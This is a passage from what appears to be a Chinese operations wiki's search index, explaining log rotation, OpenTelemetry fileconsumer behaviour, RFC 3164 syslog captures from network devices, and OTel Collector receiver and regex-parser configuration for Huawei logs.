capital, fail to turn their rapidly growing log data into actionable insights. Why can't they get value from their log data if all the pieces are available and affordable?</p> <p>That's because legacy logging infrastructure was NOT designed to be \"machine-first\", and so much effort is wasted trying to make various backend systems understand log data.</p> <p>\u4f20\u7edf\u7684\u65e5\u5fd7\u57fa\u7840\u8bbe\u65bd\u5e76\u4e0d\u662f\u4e3a\u201c\u673a\u5668\u4f18\u5148\u201d\u8bbe\u8ba1\u7684\uff0c\u5927\u91cf\u7684\u5de5\u4f5c\u90fd\u82b1\u5728\u4e86\u8ba9\u540e\u7aef\u7cfb\u7edf\u7406\u89e3\u65e5\u5fd7\u6570\u636e\u4e0a\u3002\u672c\u7ae0\u4ecb\u7ecd\u51e0\u79cd\u5e38\u89c1\u7684\u65e5\u5fd7\u683c\u5f0f\uff0c\u5e76\u5206\u6790\u5982\u4f55\u4f7f\u7528 OpenTelemetry Collector \u8fdb\u884c\u65e5\u5fd7\u5904\u7406\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#\u6b63\u5219\u8868\u8fbe\u5f0f","title":"\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>\u65e5\u5fd7\u6d88\u606f\u5341\u5206\u4f9d\u8d56\u6b63\u5219\u8868\u8fbe\u5f0f\u8fdb\u884c\u89e3\u6790\u3002OpenTelemetry Collector \u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u57fa\u4e8e Golang \u98ce\u683c\u3002</p> <p>Tip</p> <ul> <li>\u628a\u65e5\u5fd7\u5582\u7ed9 AI\uff0c\u8ba9\u5b83\u5e2e\u4f60\u5199\u6b63\u5219\u8868\u8fbe\u5f0f\u3002</li> <li>\u4f7f\u7528 regex101 \u8fdb\u884c\u7f16\u5199\u548c\u8c03\u8bd5\u3002</li> <li>\u4f7f\u7528 regex.rip \u6d4b\u8bd5\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u5426\u8106\u5f31\u3001\u6613\u53d7\u653b\u51fb\u3002</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#log-rotation","title":"Log Rotation","text":"<p>Quote</p> <ul> <li>Log Rotation - Grafana Loki documentation\uff1a\u6e05\u6670\u5730\u8bb2\u89e3\u4e86\u65e5\u5fd7\u8f6e\u8f6c\u7684\u539f\u7406\u3002</li> </ul> <p>\u5728\u8bb2\u89e3\u65e5\u5fd7\u683c\u5f0f\u548c\u5904\u7406\u524d\uff0c\u5148\u4e86\u89e3\u4e00\u4e2a\u901a\u7528\u7684\u65e5\u5fd7\u64cd\u4f5c\uff1a\u65e5\u5fd7\u8f6e\u8f6c\uff08Log Rotation\uff09\u3002</p> <p>\u57fa\u4e8e\u6587\u4ef6\u7684\u65e5\u5fd7\u7cfb\u7edf\u4f1a\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u4e0d\u65ad\u589e\u5927\uff0c\u5355\u4e2a\u6587\u4ef6\u7684\u5927\u5c0f\u4f1a\u53d8\u5f97\u65e0\u6cd5\u63a5\u53d7\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u5b9a\u671f\u5c06\u65e5\u5fd7\u6587\u4ef6\u91cd\u547d\u540d\u5e76\u521b\u5efa\u65b0\u7684\u65e5\u5fd7\u6587\u4ef6\u3002</p> <p>\u65e5\u5fd7\u8f6e\u8f6c\u4e3b\u8981\u6709\u4e24\u79cd\u65b9\u5f0f\uff1aCopy and Truncate \u548c Rename and Create\u3002\u8fc7\u7a0b\u4e2d\u6709\u4e09\u4e2a\u89d2\u8272\uff1aappender \u751f\u6210\u65e5\u5fd7\u3001rotator \u8f6e\u8f6c\u65e5\u5fd7\u3001tailer \u8bfb\u53d6\u65e5\u5fd7\u3002</p> <p>Info</p> <p>tailer \u8fd9\u4e2a\u540d\u79f0\u6765\u81ea\u4e8e <code>tail</code> \u547d\u4ee4\uff0c\u7a0b\u5e8f\u5458\u4eec\u7ecf\u5e38\u4f7f\u7528 <code>tail -f</code> \u547d\u4ee4\u6765\u67e5\u770b\u65e5\u5fd7\u6587\u4ef6\u7684\u672b\u5c3e\u3002</p> <p>Info</p> <p>\u5c0f\u77e5\u8bc6\uff1aLinux \u6587\u4ef6\u53e5\u67c4\u5728\u6587\u4ef6\u79fb\u52a8\u548c\u5220\u9664\u65f6\u4ecd\u7136\u6709\u6548\uff0c\u4e14\u4fdd\u6301\u6253\u5f00\u72b6\u6001\uff08\u540c\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff09\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5728\u4e24\u79cd\u65b9\u5f0f\u4e0b\uff0c\u65e7\u65e5\u5fd7\u7684\u6587\u4ef6\u53e5\u67c4\u90fd\u662f\u4fdd\u6301\u7684\uff0c\u56e0\u6b64\u4e0d\u7528\u62c5\u5fc3\u8f6e\u8f6c\u7684\u65e5\u5fd7\u672b\u5c3e\u4e22\u5931\u3002</p> logrotate \u5de5\u5177 <p>\u5728\u4f20\u7edf\u7684 Linux \u7cfb\u7edf\u8fd0\u7ef4\u4e2d\uff0c\u65e5\u5fd7\u8f6e\u8f6c\u4e00\u822c\u4f7f\u7528 <code>logrotate</code> \u5de5\u5177\u5b9e\u73b0\u3002\u6bd4\u5982\u4e0b\u9762\u662f\u955c\u50cf\u7ad9\u66fe\u7ecf\u7684\u65e5\u5fd7\u8f6e\u8f6c\u914d\u7f6e\uff1a</p> <pre><code>/var/log/nginx/*.log {\n        daily\n        missingok\n        rotate 14\n        compress\n        delaycompress\n        notifempty\n        create 0640 www-data adm\n        sharedscripts\n        prerotate\n                if [ -d /etc/logrotate.d/httpd-prerotate ]; then \\\n                        run-parts /etc/logrotate.d/httpd-prerotate; \\\n                fi \\\n        endscript\n        postrotate\n                invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1\n        endscript\n}\n</code></pre> <p>\u73b0\u5728\uff0c\u6211\u4eec\u4f7f\u7528 OpenTelemetry Collector \u7684 FileLogReceiver \u6765\u8bfb\u53d6\u65e5\u5fd7\u3002FileLogReceiver \u652f\u6301\u65e5\u5fd7\u8f6e\u8f6c\u64cd\u4f5c\u3002</p> tailer \u7b80\u6790\uff1a\u4ee5 fileconsumer \u4e3a\u4f8b <p>OpenTelemetry \u7684 FileLogReceiver \u4f7f\u7528 <code>pkg/stanza/fileconsumer</code> \u5b9e\u73b0\u65e5\u5fd7\u6587\u4ef6\u7684\u8bfb\u53d6\u3002 pkg/stanza/fileconsumer/design.md \u63cf\u8ff0\u4e86\u5176\u5de5\u4f5c\u539f\u7406\u3002</p> <p>\u4e00\u4e9b\u6982\u5ff5\uff1a</p> <ul> <li>\u6307\u7eb9\uff1a\u6587\u4ef6\u7684\u524d <code>N</code> \u4e2a\u5b57\u8282\uff0c\u7528\u4e8e\u6807\u8bc6\u6587\u4ef6\uff0c\u9ed8\u8ba4\u4e3a <code>1000</code> \u5373\u7ea6 1KB\u3002\u6307\u7eb9\u76f8\u540c\u7684\u6587\u4ef6\u89c6\u4e3a\u540c\u4e00\u6587\u4ef6\u3002<ul> <li>\u957f\u5ea6\u672a\u8fbe\u5230\u9650\u5236\u65f6\u91c7\u7528\u524d\u7f00\u6bd4\u8f83\u3002</li> <li>\u6587\u4ef6\u589e\u957f\u65f6\u66f4\u65b0\u6307\u7eb9\u3002</li> <li>\u80fd\u591f\u5904\u7406 Copy and Truncate \u7684 rotate \u64cd\u4f5c\u3002\u5c3d\u529b\u5728\u8bfb\u53d6\u65b0\u6587\u4ef6\u524d\u8bfb\u5230\u65e7\u6587\u4ef6\u7684\u672b\u5c3e\uff08\u8fd9\u610f\u5473\u7740\u5982\u679c\u6587\u4ef6\u65e5\u5fd7\u6ca1\u6709\u65f6\u95f4\u6233\u4fe1\u606f\uff0c\u53ef\u80fd\u4f1a\u4e71\u5e8f\uff09\u3002</li> </ul> </li> <li>Reader\uff1a\u6587\u4ef6\u53e5\u67c4\u3001\u6307\u7eb9\u3001\u504f\u79fb\u91cf\u3001\u8def\u5f84\u7b49\u3002<ul> <li>\u6587\u4ef6\u53e5\u67c4\u5173\u95ed\u65f6 Reader \u4e0d\u4f1a\u7acb\u5373\u6d88\u5931\uff0c\u5728\u56fa\u5b9a\u6b21\u6570\u7684\u8f6e\u8be2\u4e2d\u4ecd\u7136\u4fdd\u6301\uff0c\u7528\u4e8e\u76d1\u6d4b\u6587\u4ef6\u5220\u9664\u6216\u62f7\u8d1d\u3001\u83b7\u53d6\u6587\u4ef6\u66fe\u7ecf\u7684\u8def\u5f84\u7b49\u3002</li> <li>\u53ef\u4ee5\u5c06\u5176\u6301\u4e45\u5316\u4fdd\u5b58\uff0c\u4e0b\u4e00\u6b21\u542f\u52a8\u65f6\u6062\u590d\u8bfb\u53d6\u72b6\u6001\u3002</li> </ul> </li> </ul> <p>\u867d\u7136\u7b14\u8005\u611f\u89c9\u6587\u4ef6\u6307\u7eb9\u7684\u5b9e\u73b0\u6709\u4e00\u4e9b\u8349\u7387\u4e14\u6548\u7387\u4e0d\u9ad8\uff08\u548c FileBeats \u7684 inode \u6bd4\u8d77\u6765\uff09\uff0c\u4f46\u4f3c\u4e4e\u4e0d\u4f1a\u51fa\u4ec0\u4e48\u5927\u95ee\u9898\u3002</p> <p><code>fileconsumer</code> \u6309\u4e00\u5b9a\u65f6\u95f4\u95f4\u9694\u626b\u63cf\u6587\u4ef6\u7cfb\u7edf\u3002\u6bcf\u6b21\u8f6e\u8be2\u7684\u6b65\u9aa4\uff1a</p> <ol> <li>\u5339\u914d\uff1a\u626b\u63cf\u5339\u914d\u7684\u6587\u4ef6\u5217\u8868\u3002</li> <li>\u5217\u961f\uff1a\u5982\u679c\u6587\u4ef6\u6570\u91cf\u8d85\u8fc7\u6700\u5927\u5e76\u53d1\u6570\uff0c\u5219\u6587\u4ef6\u5217\u8868\u5206\u6210\u4e24\u90e8\u5206\u3002\u672c\u6b21\u8f6e\u8be2\u95f4\u9694\u5185\u5904\u7406\u524d\u4e00\u90e8\u5206\u3002\u540e\u4e00\u90e8\u5206\u8fdb\u5165\u961f\u5217\uff0c\u4e0b\u4e00\u6b21\u8f6e\u8be2\u76f4\u63a5\u4ece\u961f\u5217\u4e2d\u62ff\u6587\u4ef6\uff0c\u76f4\u5230\u961f\u5217\u4e3a\u7a7a\u3002</li> <li>\u6253\u5f00\u6587\u4ef6\uff1a\u6b64\u65f6\u6587\u4ef6\u53ef\u80fd\u88ab\u79fb\u52a8\u6216\u5220\u9664\u3002</li> <li>\u8ba1\u7b97\u6307\u7eb9</li> <li>\u6392\u9664\uff08\u5173\u95ed\u6587\u4ef6\uff09\uff1a\u672c\u6279\u6b21\u7684\u6307\u7eb9\u4ea4\u53c9\u6bd4\u5bf9\uff0c\u91cd\u590d\u6587\u4ef6\u88ab\u6392\u9664\u3002</li> <li>\u521b\u5efa Reader\uff1a\u4ea4\u53c9\u6bd4\u5bf9\u5df2\u6709 Reader \u7684\u6307\u7eb9\uff0c\u62f7\u8d1d\u4e0a\u6b21\u8fed\u4ee3\u7684 Reader\uff0c\u5426\u5219\u521d\u59cb\u5316\u3002</li> <li>\u68c0\u67e5 Lost file\uff1a\u5982\u679c\u6307\u7eb9\u80fd\u5339\u914d\u5230\u524d\u4e00\u8f6e\uff0c\u4f46\u4e0d\u80fd\u5339\u914d\u5230\u672c\u8f6e\uff0c\u88ab\u8ba4\u4e3a\u662f Lost file\u3002\u53ef\u80fd\u7531\u4e8e\u6587\u4ef6\u5220\u9664\u3001\u79fb\u52a8\u6216 rotate\u3002</li> <li>\u8bfb\u53d6\u6587\u4ef6\uff1a<ul> <li>\u8bfb\u53d6 Lost file\uff1a<ul> <li>\u5982\u679c\u6587\u4ef6\u88ab\u5220\u9664\uff0c\u64cd\u4f5c\u5931\u8d25\u3002</li> <li>\u5982\u679c\u88ab\u79fb\u52a8\uff0c\u6709\u53ef\u80fd\u7ee7\u7eed\u8bfb\u53d6\u5269\u4f59\u90e8\u5206\u3002</li> </ul> </li> <li>\u6240\u6709\u6587\u4ef6\u5e76\u53d1\u8bfb\u53d6\u3002</li> </ul> </li> <li>\u5173\u95ed\u6587\u4ef6\u3002</li> <li>\u5f52\u6863 Reader\u3002</li> <li>\u8d85\u8fc7 3 \u4e2a\u5468\u671f\u7684 Reader \u88ab\u79fb\u9664\u3002</li> <li>\u5982\u679c\u914d\u7f6e\u4e86\u6301\u4e45\u5316\uff0c\u4fdd\u5b58 Reader \u72b6\u6001\u3002</li> </ol>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#\u65e5\u5fd7\u683c\u5f0f\u5206\u6790\u4e0e\u5904\u7406","title":"\u65e5\u5fd7\u683c\u5f0f\u5206\u6790\u4e0e\u5904\u7406","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#rfc-3164---the-bsd-syslog-protocol","title":"RFC 3164 - The BSD Syslog Protocol","text":"<ul> <li>\u53d1\u5e03\u4e8e 2001 \u5e74\u3002\u76ee\u524d\u51e0\u4e4e\u6240\u6709\u786c\u4ef6\u8bbe\u65bd\u90fd\u652f\u6301 RFC 3164\u3002</li> <li>\u89c4\u5b9a\u76ee\u6807\u4e3a UDP \u7aef\u53e3 514 \u7684\u6570\u636e\u5305\u4e3a syslog \u6d88\u606f\u3002</li> <li>\u6d88\u606f\u7531\u4e09\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a<ul> <li>PRI\uff1a<code>&lt;FACILITY*8 + SEVERITY&gt;</code>\uff1a<code>FACILITY</code> \u662f\u6d88\u606f\u6765\u6e90\uff0c<code>SEVERITY</code> \u662f\u6d88\u606f\u4e25\u91cd\u7a0b\u5ea6\u3002</li> <li>HEADER\uff1a<code>TIMESTAMP HOSTNAME</code>\uff1a\u65f6\u95f4\u6233\u548c\u4e3b\u673a\u540d\u3002<ul> <li><code>TIMESTAMP</code> \u7d27\u63a5\u5728 <code>&gt;</code> \u540e\uff0c\u683c\u5f0f\u4e3a <code>Mmm dd hh:mm:ss</code>\uff0c\u4f8b\u5b50\uff1a<code>Aug  8 17:44:32</code>\u3002</li> </ul> </li> <li>MSG\uff1a<code>TAG CONTENT</code>\u3002<code>TAG</code> \u662f\u6709\u5173\u8fdb\u7a0b\u7684\u6807\u8bc6\u7b26\uff0c\u53ef\u4ee5\u662f\u7a0b\u5e8f\u540d\u6216\u8005\u8fdb\u7a0b ID\u3002</li> </ul> </li> <li>\u6ca1\u6709\u89c4\u5b9a\u65e5\u5fd7\u5185\u5bb9\u683c\u5f0f\uff08\u6307 <code>CONTENT</code> \u7684\u5185\u5bb9\uff09\uff0c\u53ea\u7ea6\u5b9a\u4f20\u8f93\u6d88\u606f\u7684\u534f\u8bae\u3002</li> </ul> <p>TP-Link \u65e5\u5fd7</p> <p>\u4ee5 TL-R473G \u4e3a\u4f8b\uff0c\u52fe\u9009\u53d1\u9001\u7cfb\u7edf\u65e5\u5fd7\u4e4b\u540e\uff0c\u53ef\u4ee5\u5728\u670d\u52a1\u5668\u4e0a\u6536\u5230\u65e5\u5fd7\u6d88\u606f\uff08\u7531\u4e8e\u6d88\u606f <code>CONTENT</code> \u90e8\u5206\u5305\u542b\u4e2d\u6587\uff0c\u663e\u793a\u4e3a\u4e71\u7801\uff09\uff1a</p> <pre><code>User Datagram Protocol, Src Port: 44144, Dst Port: 514\nSyslog message: USER.NOTICE: Aug 08 18:22:15 TL-R473G 625: 2024-08-08 18:22:15 &lt;5&gt; :  DHCP\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03aalan\ufffd\u06bf\u037b\ufffdMAC B6-10-DE-B4-DF-7D \ufffd\ufffd\ufffd\ufffd\ufffd\ufffdIP\ufffd\ufffd\u05b7192.168.1.4\n    0000 1... = Facility: USER - random user-level messages (1)\n    .... .101 = Level: NOTICE - normal but significant condition (5)\n    Message: Aug 08 18:22:15 TL-R473G 625: 2024-08-08 18:22:15 &lt;5&gt; :  DHCP\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03aalan\ufffd\u06bf\u037b\ufffdMAC B6-10-DE-B4-DF-7D \ufffd\ufffd\ufffd\ufffd\ufffd\ufffdIP\ufffd\ufffd\u05b7192.168.1.4\n        Syslog timestamp (RFC3164): Aug 08 18:22:15\n        Syslog hostname: TL-R473G\n        Syslog process id: 625\n        Syslog message id: : 2024-08-08 18:22:15 &lt;5&gt; :  DHCP\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdlan\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdMAC B6-10-DE-B4-DF-7D \ufffd\ufffd\ufffd\ufffd\ufffd\ufffdIP\ufffd\ufffd\ufffd\ufffd192.168.1.4\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u6d88\u606f\u4f7f\u7528\u4e86 RFC 3164 \u7684\u683c\u5f0f\u3002</p> <p>\u534e\u4e3a\u65e5\u5fd7</p> <p>\u534e\u4e3a\u8bbe\u5907\u7684\u7f51\u7edc\u65e5\u5fd7\u914d\u7f6e\u4e00\u822c\u5728 \u4fe1\u606f\u4e2d\u5fc3\uff08info-center\uff09 \u6a21\u5757\u4e0b\u3002\u9ed8\u8ba4\u4f7f\u7528 UDP\uff0c\u53ef\u4ee5\u914d\u7f6e TCP SSL\u3002</p> <pre><code>User Datagram Protocol, Src Port: 60936, Dst Port: 514\nSyslog message: LOCAL7.NOTICE: Aug  8 2024 11:44:37 Router %%01SHELL/5/CMDRECORD(l)[1]:Record command information. (Task=vt0, Ip=***.***.***.***, User=******, Command=\"return\", Result=Success)\n    1011 1... = Facility: LOCAL7 - reserved for local use (23)\n    .... .101 = Level: NOTICE - normal but significant condition (5)\n    Message: Aug  8 2024 11:44:37 Router %%01SHELL/5/CMDRECORD(l)[1]:Record command information. (Task=vt0, Ip=***.***.***.***, User=******, Command=\"return\", Result=Success)\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u4e5f\u662f RFC 3164 \u7684\u683c\u5f0f\u3002</p> <p>\u6d6a\u6f6e\u670d\u52a1\u5668\u65e5\u5fd7</p> <p>\u4e0a\u9762\u4e24\u4e2a\u4f8b\u5b50\u90fd\u662f UDP\uff0c\u8fd9\u6b21\u6211\u4eec\u6765\u8bd5\u8bd5 TCP\u3002</p> <p>\u6d6a\u6f6e M6 \u670d\u52a1\u5668 BMC \u53ef\u4ee5\u9009\u62e9 TCP \u65b9\u5f0f\u53d1\u9001\u65e5\u5fd7\u6d88\u606f\uff08\u4e0d\u4f7f\u7528 TLS\uff09\u3002\u4f7f\u7528 TCP \u65b9\u5f0f\u610f\u5473\u7740\u5fc5\u987b\u6709\u4e00\u4e2a\u670d\u52a1\u7aef\u5141\u8bb8\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u5426\u5219\u6d88\u606f\u65e0\u6cd5\u53d1\u9001\u3002\u6211\u4eec\u53ef\u4ee5\u5728 Windows \u4e0a\u5b89\u88c5 MaxBelkov/visualsyslog\uff08\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684 syslog \u5de5\u5177\uff0c\u652f\u6301 TCP \u548c UDP\uff09\u6765\u63a5\u6536\u65e5\u5fd7\u6d88\u606f\u3002</p> <p>\u901a\u8fc7 Wireshark \u6293\u5305\uff0c\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u8fc7\u7a0b\uff1a</p> <pre><code>Src    Dest   Pro Info\nClient Server TCP 59382  &gt;  514 [SYN]\nServer Client TCP 514  &gt;  59382 [SYN, ACK]\nClient Server TCP 59382  &gt;  514 [ACK]\nClient Server RSH Client -&gt; Server data\n</code></pre> <p>\u6d88\u606f\u88ab Wireshark \u8bc6\u522b\u4e3a RSH\uff0c\u4f46\u5b9e\u9645\u4e0a\u662f syslog \u6d88\u606f\uff0c\u53ef\u4ee5\u4ece\u89e3\u6790\u7684\u6570\u636e\u770b\u5230\u6d88\u606f\u5185\u5bb9\uff1a</p> <pre><code>&lt;190&gt;Aug  8 17:44:32 221823342 221823342:  Syslog Destination 0 Test Sent Successfully!\n</code></pre> <p>\u8fd9\u4e5f\u662f RFC 3164 \u7684\u683c\u5f0f\u3002</p> <p>\u5751\u4eba\u7684\u4ea7\u5546</p> <p>\u534e\u5b50\uff0c\u8bf4\u7684\u5c31\u662f\u4f60\u3002</p> <p>\u534e\u4e3a\u7684 syslog \u6d88\u606f\u4e2d\uff0cTIMESTAMP \u5e76\u4e0d\u4e25\u683c\u9075\u5faa RFC \u7684\u683c\u5f0f\u3002\u9ed8\u8ba4\u4e3a <code>Aug  8 2024 11:44:37</code>\uff0c\u591a\u4e86\u4e00\u4e2a\u5e74\u4efd\u3002\u8fd9\u6837\u7684\u6d88\u606f\u5728\u4e00\u4e9b\u65e5\u5fd7\u5206\u6790\u5de5\u5177\u4e2d\u4f1a\u88ab\u8bc6\u522b\u4e3a\u9519\u8bef\u683c\u5f0f\uff0c\u5bfc\u81f4\u65e0\u6cd5\u89e3\u6790\u3002</p> <p>\u6211\u4eec\u5728\u914d\u7f6e OTel Collector Receiver \u65f6\u78b0\u5230\u4e86\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u89c1  syslog receiver Error expecting a Stamp timestamp [col 5] \u00b7 Issue #33344 \u00b7 open-telemetry/opentelemetry-collector-contrib\u3002</p> <p>After reading RFC 3164, I found that the issue occurs because HUAWEI does not follow the TIMESTAMP field format as defined in the RFC. According to RFC 3164, the TIMESTAMP field should be in the format <code>Mmm dd hh:mm:ss</code>, but HUAWEI adds the year (<code>YYYY</code>) between <code>Mmm</code> and <code>dd</code>, which causes the FSM (Finite State Machine) in <code>go-syslog</code> to fail.</p> <p>HUAWEI defines multiple timestamp formats: <code>mm dd yyyy hh:mm:ss</code> is referred to as the \"date\" type and is set as the default. However, they also provide a \"short-date\" type that adheres to RFC 3164. After configuring it to use the \"short-date\" format, the error was resolved.</p> <p>OTel Collector \u63d0\u4f9b Syslog Receiver \u89e3\u6790 syslog \u6d88\u606f\uff1a</p> <pre><code>syslog:\n  udp:\n    listen_address: otel-collector:514\n    add_attributes: true\n    one_log_per_packet: true\n  protocol: rfc3164\n  # we configure all infrastructure to use the same timezone UTC +8\n  location: Asia/Shanghai\n</code></pre> <p>\u914d\u7f6e\u65f6\u95f4</p> <p>\u4e3a\u65b9\u4fbf\u8fd0\u7ef4\uff0c\u6211\u4eec\u7ea6\u5b9a\uff0c\u8f6f\u786c\u4ef6\u8bbe\u5907\u7edf\u4e00\u4f7f\u7528 <code>time.zju.edu.cn</code> \u4f5c\u4e3a NTP \u670d\u52a1\u5668\uff0c\u65f6\u533a\u914d\u7f6e\u4e3a\u4e1c\u516b\u533a\u3002\u90e8\u5206\u786c\u4ef6\u8bbe\u5907\u5728\u4e0a\u62a5\u65e5\u5fd7\u65f6\u53ef\u80fd\u4f1a\u4f7f\u7528 UTC \u65f6\u95f4\uff0c\u9700\u8981\u6ce8\u610f\u914d\u7f6e\u3002\u4f8b\u5982\uff0c\u534e\u4e3a\u4fe1\u606f\u4e2d\u5fc3\u53d1\u9001\u65e5\u5fd7\u65f6\u9700\u8981\u5236\u5b9a <code>local-time</code> \u53c2\u6570\uff0c\u5426\u5219\u53d1\u9001 UTC \u65f6\u95f4\u3002</p> <p>\u8be5 Receiver \u89e3\u6790\u7684\u6d88\u606f\u683c\u5f0f\u5982\u4e0b\u6240\u793a\u3002\u539f\u59cb\u6d88\u606f\u5185\u5bb9\u4fdd\u5b58\u5728 Body\uff0c\u63d0\u53d6\u51fa <code>PRI</code>\u3001<code>TIMESTAMP</code> \u7b49 RFC \u4e2d\u5b9a\u4e49\u7684\u5b57\u6bb5\u4f5c\u4e3a Attributes\u3002<code>net</code> \u5f00\u5934\u7684\u5b57\u6bb5\u662f\u901a\u8fc7 <code>add_attributes: true</code> \u6307\u5b9a\u6dfb\u52a0\u7684\u3002</p> <pre><code>ObservedTimestamp: 2024-10-04 15:46:26.809948211 +0000 UTC\nTimestamp: 2024-10-04 15:46:14 +0000 UTC\nSeverityText: notice\nSeverityNumber: Info2(10)\nBody: Str(&lt;189&gt;Oct  4 23:46:14 Huawei %%01SHELL/5/CMDRECORD(l)[324]:Record command information. (Task=vt0, Ip=192.168.1.178, User=admin, Command=\"log off (ssh user)\", Result=Success) )\nAttributes:\n     -&gt; net.host.port: Str(514)\n     -&gt; net.peer.name: Str(192.168.1.1)\n     -&gt; appname: Str(%%01SHELL/5/CMDRECORD(l))\n     -&gt; net.transport: Str(IP.UDP)\n     -&gt; net.host.name: Str(c91dcf42473a)\n     -&gt; net.peer.port: Str(49377)\n     -&gt; proc_id: Str(324)\n     -&gt; hostname: Str(Huawei)\n     -&gt; net.host.ip: Str(172.21.0.2)\n     -&gt; message: Str(324]:Record command information. (Task=vt0, Ip=192.168.1.178, User=admin, Command=\"log off (ssh user)\", Result=Success) )\n     -&gt; priority: Int(189)\n     -&gt; net.peer.ip: Str(192.168.1.1)\n     -&gt; facility: Int(23)\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528 Operator \u7ee7\u7eed\u89e3\u6790\u6d88\u606f\u5185\u5bb9\u3002\u6bd4\u5982\u534e\u4e3a\u65e5\u5fd7\u683c\u5f0f\u4e2d\uff0c<code>TAG</code> \u90e8\u5206\u5b57\u6bb5\u5982\u4e0b\uff1a</p> \u5b57\u6bb5 \u5b57\u6bb5\u542b\u4e49 \u8bf4\u660e %% \u534e\u4e3a\u516c\u53f8\u7684\u6807\u8bc6 \u6807\u8bc6\u8be5 Log \u4fe1\u606f\u662f\u7531\u534e\u4e3a\u516c\u53f8\u7684\u4ea7\u54c1\u8f93\u51fa\u7684\u3002 dd \u7248\u672c\u53f7 \u6807\u8bc6\u8be5 Log \u4fe1\u606f\u683c\u5f0f\u7684\u7248\u672c\u3002 ModuleName \u6a21\u5757\u540d \u5411\u4fe1\u606f\u4e2d\u5fc3\u8f93\u51fa\u4fe1\u606f\u7684\u6a21\u5757\u540d\u79f0\u3002 Serverity \u65e5\u5fd7\u7684\u7ea7\u522b Log \u4fe1\u606f\u7684\u7ea7\u522b\u3002 Brief \u7b80\u8981\u63cf\u8ff0 Log \u4fe1\u606f\u7684\u7b80\u8981\u89e3\u91ca\u3002 (l) \u4fe1\u606f\u7684\u7c7b\u522b \u4fe1\u606f\u7684\u7c7b\u578b\u6709\uff1al\uff1aLog \u4fe1\u606f\u3002S\uff1a\u5b89\u5168\u65e5\u5fd7\u4fe1\u606f\u3002D\uff1a\u8bca\u65ad\u65e5\u5fd7\u4fe1\u606f\u3002 <p>\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u4ece\u4e2d\u63d0\u53d6\u51fa\u6a21\u5757\u540d\u3001\u65e5\u5fd7\u7ea7\u522b\u548c\u7b80\u8981\u63cf\u8ff0\uff1a</p> <pre><code>operators:\n  - type: router\n    routes:\n      - output: huawei_add_resource\n        # before escape: %%\\d+[^\\/]+\\/\\d+\\/.+\\(.+\\)\n        expr: 'attributes.appname matches \"%%\\\\d+[^\\\\/]+\\\\/\\\\d+\\\\/.+\\\\(.+\\\\)\"'\n    default: noop\n  - id: huawei_add_resource\n    type: add\n    field: resource.device.manufacturer\n    value: Huawei\n    output: huawei_regex_parser\n  - id: huawei_regex_parser\n    type: regex_parser\n    parse_from: attributes.appname\n    parse_to: attributes.huawei\n    regex: '%%(?P&lt;version&gt;\\d+)(?P&lt;module_name&gt;[^\\/]+)\\/(?P&lt;serverity&gt;\\d+)\\/(?P&lt;brief&gt;.+)\\((?P&lt;type&gt;.+)\\)'\n  - id: noop\n    type: noop\n</code></pre> <p>\u63d0\u53d6\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>-&gt; huawei: Map({\"brief\":\"USER_OFFLINERESULT\",\"module_name\":\"CM\",\"serverity\":\"5\",\"type\":\"s\",\"version\":\"01\"})\n</code></pre> <p>\u534e\u5b50\u771f\u633a\u5751\u7684</p> <p>\u534e\u4e3a\u4e0d\u540c\u8bbe\u5907\u4e0d\u540c\u7cfb\u7edf\u7248\u672c\u65e5\u5fd7\u7ed3\u6784\u53ef\u80fd\u4e0d\u4e00\u6837\uff0c\u9700\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574\u89e3\u6790\u89c4\u5219\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#rfc-5424---the-syslog-protocol","title":"RFC 5424 - The Syslog Protocol","text":"<p>\u672c\u8282\u53ef\u4ee5\u8df3\u8fc7</p> <p>\u6211\u4eec\u8fd8\u6ca1\u63a5\u89e6\u8fc7\u4f7f\u7528 RFC 5424 \u7684\u8bbe\u5907\u3002</p> <ul> <li>\u53d1\u5e03\u4e8e 2009 \u5e74\u3002\u5728 RFC 3164 \u7684\u57fa\u7840\u4e0a\u5b9a\u4e49\u7ed3\u6784\u5316\u6d88\u606f\u683c\u5f0f\uff0c\u4e3a\u6574\u4f53\u67b6\u6784\u5206\u5c42\u3002\u5404\u5c42\u4e4b\u95f4\u72ec\u7acb\uff1a<ul> <li><code>content</code> \u5c42\uff1a\u5185\u5bb9\u3002</li> <li><code>application</code>\uff1a\u751f\u6210\u3001\u7ffb\u8bd1\u3001\u8def\u7531\u3001\u5b58\u50a8\u3002</li> <li><code>transport</code>\uff1a\u4f20\u8f93\uff0c\u6bd4\u5982\u73b0\u5728\u53ef\u4ee5\u4f7f\u7528 UDP \u4e4b\u5916\u7684\u534f\u8bae\uff0c\u5efa\u8bae\u4f7f\u7528 TLS \u4e3a\u57fa\u7840\u7684\u534f\u8bae\u3002</li> </ul> </li> <li> <p>\u7ed3\u6784\u5316\u6d88\u606f\u4f7f\u7528 ABNF\uff08\u6269\u5c55\u7684 